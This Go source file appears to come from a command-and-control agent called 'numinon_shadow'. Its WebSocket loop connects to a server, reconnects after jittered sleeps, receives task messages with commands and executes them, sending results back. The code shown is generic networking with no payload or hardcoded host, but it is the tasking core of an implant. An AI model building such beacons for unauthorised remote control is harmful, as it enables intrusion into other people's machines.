package agent

import (
	"encoding/json"
	"fmt"
	"log"
	"numinon_shadow/internal/agent/comm"
	"numinon_shadow/internal/agent/config"
	"numinon_shadow/internal/models"
	"time"
)

// runWsLoop handles the persistent connection and message handling for WebSocket protocols.
func (a *Agent) runWsLoop() error {
	log.Println("|AGENT LOOP WS|-> WebSocket loop starting...")

	if a.config.Protocol != config.WebsocketClear && a.config.Protocol != config.WebsocketSecure {
		log.Printf("|❗CRIT AGENT LOOP| Communicator is not the expected WebSocket type!")
		return fmt.Errorf("internal error: communicator is not a WebSocket type")
	}

	commWs, ok := a.communicator.(comm.WsCommunicator)
	if !ok {
		log.Printf("|❗CRIT AGENT LOOP| Communicator is not a WebSocket-capable type!")
		return fmt.Errorf("internal error: communicator does not support WebSocket operations")
	}

	// --- Connection Loop ---
	// This outer loop handles attempting to connect/reconnect.
	for {

		select {
		case <-a.stopChan: // Check for stop signal before attempting connection
			log.Println("|AGENT LOOP WS|-> Stop signal received, exiting WS loop.")
			return nil
		default:
			// Not asked to stop, proceed with connection attempt
		}

		log.Println("|AGENT LOOP WS|-> Attempting connection...")
		err := a.communicator.Connect()
		if err != nil {
			log.Printf("|❗ERR AGENT LOOP WS| Connection failed: %v. Retrying after sleep...", err)
			time.Sleep(a.calculateSleepWithJitter())
			continue
		}

		log.Println("|AGENT LOOP WS|-> Connection established. Entering read loop...")

		// --- Read Loop ---
	readLoop:
		for {
			select {
			case <-a.stopChan: // Check stop signal before blocking read
				log.Println("|AGENT LOOP WS|-> Stop signal received during read loop, disconnecting.")
				_ = a.communicator.Disconnect() // Attempt clean disconnect
				return nil                      // Exit main function
			default:
				// Proceed with reading
			}

			// Block and read the next message
			// Use the type-asserted communicator to call the specific read method

			messageBytes, err := commWs.ReadTaskMessage() // BLOCKING CALL

			if err != nil {
				log.Printf("|❗ERR AGENT LOOP WS| Read error: %v. Assuming disconnect, will attempt reconnect.", err)
				break readLoop
			}

			// Message received, but might be empty if ReadTaskMessage handled non-task types
			if messageBytes == nil {
				// log.Println("|AGENT LOOP WS|-> Received nil message bytes (e.g., PING/PONG or handled internally), continuing read.")
				continue readLoop // Wait for the next message
			}

			log.Printf("|AGENT LOOP WS|-> Received %d bytes via WebSocket.", len(messageBytes))

			// Attempt to unmarshal as a server task
			var taskResp models.ServerTaskResponse
			err = json.Unmarshal(messageBytes, &taskResp)
			if err != nil {
				log.Printf("|WARN AGENT LOOP WS| Failed to unmarshal received message as task: %v. Message: %s", err, string(messageBytes))
				continue readLoop // Ignore malformed message, wait for next
			}

			// Check if it's a valid task (or just a heartbeat/other message type?)
			// For now, assume any valid ServerTaskResponse JSON with TaskAvailable=true is a task
			if !taskResp.TaskAvailable {
				log.Println("|AGENT LOOP WS|-> Received message, but TaskAvailable is false.")
				continue readLoop
			}

			// --- Task Available ---
			log.Printf("|AGENT LOOP WS|-> Task received via WebSocket (ID: %s, Cmd: %s). Handling...", taskResp.TaskID, taskResp.Command)
			// Use a goroutine? If handleTask blocks for long, we can't read new tasks.
			// For now, run synchronously. Revisit if tasks become long-running.
			a.executeTask(taskResp) // This will call communicator.SendResult internally

			// After handling, loop back to read the next message immediately.
		} // End of inner read loop

		// If we broke out of readLoop due to error, sleep before retrying connection
		// log.Printf("|AGENT LOOP WS|-> Read loop exited. Sleeping before reconnect attempt...")
		// time.Sleep(a.calculateSleepWithJitter())

	} // End of outer connection loop
}
